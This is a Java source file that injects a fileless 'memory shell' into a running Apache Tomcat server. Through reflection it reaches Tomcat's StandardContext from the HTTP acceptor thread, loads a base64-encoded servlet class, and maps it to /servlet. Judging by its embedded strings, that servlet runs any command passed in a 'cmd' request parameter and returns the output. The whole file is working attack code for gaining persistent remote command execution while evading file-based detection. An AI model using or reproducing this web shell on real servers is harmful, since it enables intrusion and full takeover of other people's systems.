package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class InjectServletByServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        Object StandardContext= null;
        String servletname="MyServlet";
        String urlPattern = "/servlet";
        try{
            StandardContext = getContext();
            ClassLoader classLoader=Thread.currentThread().getContextClassLoader();
            String ServletBase64="yv66vgAAADQAkAoAHABYBwBZBwBaCABbCwACAFwKABsAXQsAAwBeCgBfAGAHAGEKAGIAYwoAYgBkCgBlAGYHAGcKAA0AaAcAaQoADwBqBwBrCgARAFgKAA8AbAcAbQoAFABYCgAUAG4IAG8KABQAcAoAEQBxCgARAHAHAHIHAHMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC0xNeVNlcnZsZXQ7AQAEaW5pdAEAIChMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOylWAQANc2VydmxldENvbmZpZwEAHUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRDb25maWc7AQAKRXhjZXB0aW9ucwcAdAEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAEcmVzcAEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAANjbWQBAA1TdGFja01hcFRhYmxlBwByBwB1BwB2BwBZBwBaBwB3BwBhBwB4AQALQ29tbWFuZEV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAnJ0AQATTGphdmEvbGFuZy9SdW50aW1lOwEABHByb2MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3RkZXJyAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQADaXNyAQAbTGphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXI7AQACYnIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQACc2IBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsHAHkHAHoHAHsHAGcHAGkHAGsBAAdkZXN0cm95AQAKU291cmNlRmlsZQEADk15U2VydmxldC5qYXZhDAAdAB4BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAdzZXJ2bGV0DAB8AEEMAEAAQQwAfQB+BwB/DACAAIEBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwB5DACCAIMMAIQAhQcAegwAhgCHAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAHQCIAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAHQCJAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwAigCLAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAIwAjQEAAQoMAI4AiwwAjACPAQAJTXlTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAQamF2YS9sYW5nL1N0cmluZwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEADGdldFBhcmFtZXRlcgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsAIQAbABwAAAAAAAUAAQAdAB4AAQAfAAAALwABAAEAAAAFKrcAAbEAAAACACAAAAAGAAEAAAANACEAAAAMAAEAAAAFACIAIwAAAAEAJAAlAAIAHwAAADUAAAACAAAAAbEAAAACACAAAAAGAAEAAAAPACEAAAAWAAIAAAABACIAIwAAAAAAAQAmACcAAQAoAAAABAABACkAAQAqACsAAgAfAAAA3gACAAcAAAAvK8AAAk4swAADOgQtEgS5AAUCADoFKhkFtgAGOgYZBLkABwEAGQa2AAinAAU6BrEAAQAVACkALAAJAAMAIAAAACIACAAAABIABQATAAsAFAAVABcAHQAYACkAGgAsABkALgAcACEAAABIAAcAHQAMACwALQAGAAAALwAiACMAAAAAAC8ALgAvAAEAAAAvADAAMQACAAUAKgAyADMAAwALACQANAA1AAQAFQAaADYALQAFADcAAAAfAAL/ACwABgcAOAcAOQcAOgcAOwcAPAcAPQABBwA+AQAoAAAABgACACkAPwABAEAAQQACAB8AAAEpAAMACQAAAGC4AApNLCu2AAtOLbYADDoEuwANWRkEtwAOOgW7AA9ZGQW3ABA6BgE6B7sAEVm3ABI6CBkGtgATWToHxgAgGQi7ABRZtwAVGQe2ABYSF7YAFrYAGLYAGVen/9sZCLYAGrAAAAADACAAAAAqAAoAAAAfAAQAIAAKACEAEAAiABsAIwAmACQAKQAlADIAJwA9ACgAWgArACEAAABcAAkAAABgACIAIwAAAAAAYAA2AC0AAQAEAFwAQgBDAAIACgBWAEQARQADABAAUABGAEcABAAbAEUASABJAAUAJgA6AEoASwAGACkANwBMAC0ABwAyAC4ATQBOAAgANwAAACUAAv8AMgAJBwA4BwA9BwBPBwBQBwBRBwBSBwBTBwA9BwBUAAAnACgAAAAEAAEACQABAFUAHgABAB8AAAArAAAAAQAAAAGxAAAAAgAgAAAABgABAAAALwAhAAAADAABAAAAAQAiACMAAAABAFYAAAACAFc=";
            byte[] ServletClass = new BASE64Decoder().decodeBuffer(ServletBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class servletClass = (Class) defineClass1.invoke(classLoader, ServletClass, 0, ServletClass.length);
            Servlet servletObject=(Servlet)servletClass.newInstance();


            // Wrapper
//            Class<?> standardWrapper=classLoader.loadClass("org.apache.catalina.core.StandardWrapper");
//            Constructor standardWrapperCons=standardWrapper.getDeclaredConstructor();
//            standardWrapperCons.setAccessible(true);
//            Object StandardWrapper=standardWrapperCons.newInstance();

            Method m0=StandardContext.getClass().getDeclaredMethod("createWrapper");
            m0.setAccessible(true);
            Object StandardWrapper=m0.invoke(StandardContext);

            Method m1=StandardWrapper.getClass().getDeclaredMethod("setServletName",String.class);
            m1.setAccessible(true);
            m1.invoke(StandardWrapper,servletname);

//            Method m6=StandardWrapper.getClass().getSuperclass().getDeclaredMethod("setName",String.class);
//            m6.setAccessible(true);
//            m6.invoke(StandardWrapper,servletname);

            Method m2=StandardWrapper.getClass().getDeclaredMethod("setServletClass",String.class);
            m2.setAccessible(true);
            m2.invoke(StandardWrapper,servletClass.getName());

            Method m3=StandardWrapper.getClass().getDeclaredMethod("setServlet", Servlet.class);
            m3.setAccessible(true);
            m3.invoke(StandardWrapper,servletObject);

            Class<?> ContainerClass=classLoader.loadClass("org.apache.catalina.Container");
            Method m5=StandardContext.getClass().getDeclaredMethod("addChild",ContainerClass);
            m5.setAccessible(true);
            m5.invoke(StandardContext,StandardWrapper);

            Method m4=StandardContext.getClass().getDeclaredMethod("addServletMapping",String.class,String.class);
            m4.setAccessible(true);
            m4.invoke(StandardContext,urlPattern,servletname);

        } catch (Exception e){e.printStackTrace();}
    }


    public Object getContext() throws NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field field=threadGroup.getClass().getDeclaredField("threads");
        field.setAccessible(true);
        Thread[] threads=(Thread[])field.get(threadGroup);
        for (Thread thread : threads) {
            if (thread.getName().contains("Acceptor") && thread.getName().contains("http")) {
                Field tfield = thread.getClass().getDeclaredField("target");
                tfield.setAccessible(true);
                Object NioEndpoint$ = tfield.get(thread);

                Field thisField = NioEndpoint$.getClass().getDeclaredField("this$0");
                thisField.setAccessible(true);
                Object NioEndpointO = thisField.get(NioEndpoint$);

                Field handlerField = NioEndpointO.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                ;
                handlerField.setAccessible(true);
                Object AbstractProtocol = handlerField.get(NioEndpointO);

                Field globalField = AbstractProtocol.getClass().getDeclaredField("proto");
                globalField.setAccessible(true);
                Object Http11NioProtocol = globalField.get(AbstractProtocol);

                Field adapterField = Http11NioProtocol.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("adapter");
                adapterField.setAccessible(true);
                Object CoyoteAdapter = adapterField.get(Http11NioProtocol);

                Field connectorField = CoyoteAdapter.getClass().getDeclaredField("connector");
                connectorField.setAccessible(true);
                Object Connector = connectorField.get(CoyoteAdapter);

                Field serviceField = Connector.getClass().getDeclaredField("service");
                serviceField.setAccessible(true);
                Object StandardService = serviceField.get(Connector);

                Field engineField = StandardService.getClass().getDeclaredField("engine");
                engineField.setAccessible(true);
                Object StandardEngine = engineField.get(StandardService);

                Field childrenField = StandardEngine.getClass().getSuperclass().getDeclaredField("children");
                childrenField.setAccessible(true);
                HashMap HashMap = (java.util.HashMap) childrenField.get(StandardEngine);

                Object StandardHost = HashMap.values().iterator().next();
                Field childrenFieldH = StandardHost.getClass().getSuperclass().getDeclaredField("children");
                childrenFieldH.setAccessible(true);
                HashMap hashMap = (HashMap) childrenFieldH.get(StandardHost);

                Object standardContext = hashMap.values().iterator().next();
                return standardContext;
            }
        }
        return null;
    }
}

